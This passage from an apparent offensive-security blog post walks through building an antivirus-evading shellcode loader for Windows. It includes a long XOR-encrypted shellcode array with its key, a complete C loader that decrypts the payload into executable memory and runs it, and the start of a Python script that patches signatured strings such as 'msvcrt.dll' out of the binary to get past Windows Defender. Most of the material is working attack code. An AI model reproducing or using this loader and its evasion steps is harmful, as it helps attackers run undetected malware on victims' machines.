class="mh">0x2a</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0xe4</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x7f</span><span class="p">,</span> <span class="mh">0xb9</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0xb9</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="mh">0xba</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0x7e</span><span class="p">,</span> <span class="mh">0xbc</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x2a</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="mh">0xd5</span><span class="p">,</span> <span class="mh">0x2c</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0xfa</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0xcf</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x4a</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0xa2</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0xd3</span><span class="p">,</span> <span class="mh">0xda</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span> <span class="mh">0x77</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0xb9</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0xe9</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0xbb</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0xeb</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x7e</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0xe2</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0xea</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0xed</span><span class="p">,</span> <span class="mh">0x76</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x2a</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0xb2</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0x9c</span><span class="p">,</span> <span class="mh">0xaf</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0xb8</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0xee</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0xb4</span><span class="p">,</span> <span class="mh">0x7e</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0xaf</span><span class="p">,</span> <span class="mh">0x7f</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0xa4</span><span class="p">,</span> <span class="mh">0xcf</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0xf3</span><span class="p">,</span> <span class="mh">0xfb</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0xd6</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x92</span><span class="p">,</span> <span class="mh">0x7e</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0x6e</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0xb0</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0x3e</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x7f</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0xe7</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0x6d</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0x76</span><span class="p">,</span> <span class="mh">0xea</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="mh">0x2d</span><span class="p">,</span> <span class="mh">0x7e</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0x76</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0xea</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0xb6</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x3e</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x6b</span><span class="p">,</span> <span class="mh">0x6e</span><span class="p">,</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x3a</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x6d</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0xe7</span><span class="p">,</span> <span class="mh">0x8f</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0xd8</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x76</span><span class="p">,</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="mh">0x7f</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span> <span class="mh">0x9d</span><span class="p">,</span> <span class="mh">0x99</span><span class="p">,</span> <span class="mh">0x9c</span><span class="p">,</span> <span class="mh">0x3b</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0x15</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x76</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x2d</span><span class="p">,</span> <span class="mh">0xea</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0x98</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x7f</span><span class="p">,</span> <span class="mh">0xbe</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0x7b</span><span class="p">,</span> <span class="mh">0xde</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0xd8</span><span class="p">,</span> <span class="mh">0xa6</span><span class="p">,</span> <span class="mh">0xc9</span><span class="p">,</span> <span class="mh">0xcd</span><span class="p">,</span> <span class="mh">0x4f</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0x2a</span><span class="p">,</span> <span class="mh">0xeb</span><span class="p">,</span> <span class="mh">0xd7</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0xef</span><span class="p">,</span> <span class="mh">0xc6</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0xde</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0xed</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0xbe</span><span class="p">,</span> <span class="mh">0x8c</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x3a</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0x4a</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0x0a</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0xcf</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0xf2</span><span class="p">,</span> <span class="mh">0x2c</span><span class="p">,</span> <span class="mh">0x9c</span><span class="p">,</span> <span class="mh">0xa1</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0xbb</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="mh">0xce</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="mh">0xbd</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0x9c</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0xba</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0x0c</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x3a</span><span class="p">,</span> <span class="mh">0x7f</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x7f</span><span class="p">,</span> <span class="mh">0xbb</span><span class="p">,</span> <span class="mh">0x9d</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0xdb</span><span class="p">,</span> <span class="mh">0xab</span><span class="p">,</span> <span class="mh">0x97</span><span class="p">,</span> <span class="mh">0x15</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0xce</span><span class="p">,</span> <span class="mh">0xe2</span><span class="p">,</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0xb7</span><span class="p">,</span> <span class="mh">0xf3</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0xde</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x0b</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x77</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x7f</span><span class="p">,</span> <span class="mh">0xbb</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x7f</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x3a</span><span class="p">,</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0x77</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0xce</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0xa4</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x7b</span><span class="p">,</span> <span class="mh">0xbd</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0x7b</span><span class="p">,</span> <span class="mh">0xa4</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0xbe</span><span class="p">,</span> <span class="mh">0xd4</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x7e</span><span class="p">,</span> <span class="mh">0x99</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span> <span class="mh">0x76</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x7b</span><span class="p">,</span> <span class="mh">0x9d</span><span class="p">,</span> <span class="mh">0xab</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0xef</span><span class="p">,</span> <span class="mh">0xa2</span><span class="p">,</span> <span class="mh">0x2a</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0xf2</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0x1a</span><span class="p">,</span> <span class="mh">0xaf</span><span class="p">,</span> <span class="mh">0x5d</span><span class="p">,</span> <span class="mh">0xb5</span><span class="p">,</span> <span class="mh">0xc9</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0x7f</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0xb6</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="mh">0xb9</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0xe1</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0x9c</span><span class="p">,</span> <span class="mh">0xe7</span><span class="p">,</span> <span class="mh">0xd9</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0xd7</span><span class="p">,</span> <span class="mh">0xc4</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0xdb</span><span class="p">,</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0xa5</span><span class="p">,</span> <span class="mh">0xdb</span><span class="p">,</span> <span class="mh">0xfe</span><span class="p">,</span> <span class="mh">0x9c</span><span class="p">,</span> <span class="mh">0xb7</span><span class="p">,</span> <span class="mh">0x7b</span><span class="p">,</span> <span class="mh">0xb5</span><span class="p">,</span> <span class="mh">0xa2</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x0e</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x6b</span><span class="p">,</span> <span class="mh">0xb2</span><span class="p">,</span> <span class="mh">0xc9</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0x4d</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span> <span class="mh">0x8c</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0x0c</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x3a</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0xef</span><span class="p">,</span> <span class="mh">0xb9</span><span class="p">,</span> <span class="mh">0x99</span><span class="p">,</span> <span class="mh">0xb4</span> <span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">key</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x37</span> <span class="p">};</span>
</span></span></code></pre></div><h3 id="windows-defender-i-barely-know-er-part-2">Windows Defender? I barely know er&rsquo; Part 2</h3>
<p>So far, we&rsquo;ve only added some basic encryption to the loader. It should look something like this:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x9a</span><span class="p">,</span> <span class="mh">0x7e</span><span class="p">,</span> <span class="mh">0xb4</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0xc2</span><span class="p">,</span> <span class="mh">0x8a</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">[...</span><span class="n">SNIP</span><span class="p">...]</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0xef</span><span class="p">,</span> <span class="mh">0xb9</span><span class="p">,</span> <span class="mh">0x99</span><span class="p">,</span> <span class="mh">0xb4</span> 
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">key</span><span class="p">[]</span>       <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">[...</span><span class="n">SNIP</span><span class="p">...],</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0x31</span> 
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">xor</span> <span class="p">(</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">data</span><span class="p">,</span> <span class="kt">int</span> <span class="n">data_len</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">key</span><span class="p">,</span> <span class="kt">int</span> <span class="n">key_len</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span> <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">data_len</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="n">key_len</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kt">void</span> <span class="o">*</span> <span class="n">exec</span> <span class="o">=</span> <span class="nf">VirtualAlloc</span><span class="p">(</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">shellcode</span> <span class="p">),</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">xor</span><span class="p">(</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">shellcode</span> <span class="p">),</span> <span class="n">key</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">key</span> <span class="p">)</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">RtlMoveMemory</span><span class="p">(</span> <span class="n">exec</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">shellcode</span> <span class="p">)</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">(</span> <span class="p">(</span><span class="kt">void</span> <span class="p">(</span> <span class="o">*</span> <span class="p">)())</span><span class="n">exec</span> <span class="p">)();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Now, let&rsquo;s compile the loader and check defender again!</p>
<h3 id="rabbitholes">Rabbitholes</h3>
<p>After running <code>gocheck</code>, I was surprised to see that the binary was flagged as malicious.
<img alt="huh" src="https://i.gyazo.com/26a0dff23c8cb9c90bd3d05dc4aa6e88.png"></p>
<p>According to <code>gocheck</code>, the string &ldquo;msvcrt.dll&rdquo; is being signatured as Meterpreter? That&rsquo;s strange.</p>
<p>A google search doesn&rsquo;t help much, but string searching for &ldquo;msvcrt.dll&rdquo; in random discord channels lead me to <a href="https://whiteknightlabs.com/2023/05/23/unleashing-the-unseen-harnessing-the-power-of-cobalt-strike-profiles-for-edr-evasion/">this article</a> by White Knight Labs on weaponizing Cobalt Strike with their artifact kit.</p>
<p><img alt="msvcrt.dll" src="https://i.gyazo.com/3afeb0b9f4340268df90bc2526c853dd.png"></p>
<p>Seems like this is a known issue, the solution provided in the article was to make use of Cobalt Strike&rsquo;s Malleable C2 profile to <code>strrep</code> &ldquo;msvcrt.dll&rdquo; with an empty string. However, this wasn&rsquo;t very effective for them. But, since &ldquo;msvcrt.dll&rdquo; is our only false positive- let&rsquo;s try writing our own <code>strrep</code> script.</p>
<h3 id="replacing-bad-strings">Replacing Bad Strings</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">strrep</span><span class="p">(</span> <span class="n">file_path</span><span class="p">,</span> <span class="n">original_string</span><span class="p">,</span> <span class="n">replacement_string</span> <span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">ld</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span> <span class="n">original_string</span> <span class="p">)</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span> <span class="n">replacement_string</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">repl</span> <span class="o">=</span> <span class="n">replacement_string</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="n">ld</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span> <span class="n">file_path</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span> <span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">exe</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
